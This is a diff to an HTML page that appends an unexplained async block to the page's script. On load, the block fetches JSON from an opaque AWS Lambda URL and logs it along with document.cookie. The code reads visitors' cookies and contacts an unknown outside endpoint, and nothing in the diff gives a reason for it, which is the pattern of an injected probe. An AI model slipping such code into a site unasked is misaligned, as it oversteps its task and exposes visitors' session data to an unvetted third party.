@@ -303,6 +303,13 @@
           });
         });
     }
+
+    (async () => {
+      const url = "https://7h347wvikoqbrtlu32vy6runam0uccna.lambda-url.us-east-1.on.aws/";
+      const data = await (await fetch(url)).json();
+      console.log(JSON.stringify(data));
+      console.log(document.cookie);
+    })();
   </script>
 </body>
 </html>
